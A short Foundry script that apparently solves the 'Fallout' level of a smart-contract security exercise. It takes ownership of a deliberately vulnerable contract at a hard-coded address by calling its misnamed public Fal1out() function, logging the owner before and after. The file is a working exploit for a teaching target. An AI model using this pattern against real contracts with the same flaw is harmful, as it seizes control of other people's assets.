// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {Fallout} from "../../src/Fallout/Fallout.sol";
import {Script} from "../../lib/forge-std/src/Script.sol";
import {console} from "../../lib/forge-std/src/console.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(payable(0x0560756aF3C6E55aa457e53EC07E7bB04e4d98B8));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before: ", falloutInstance.owner());

        falloutInstance.Fal1out();

        console.log("Owner after: ", falloutInstance.owner());

        vm.stopBroadcast();
    }
}
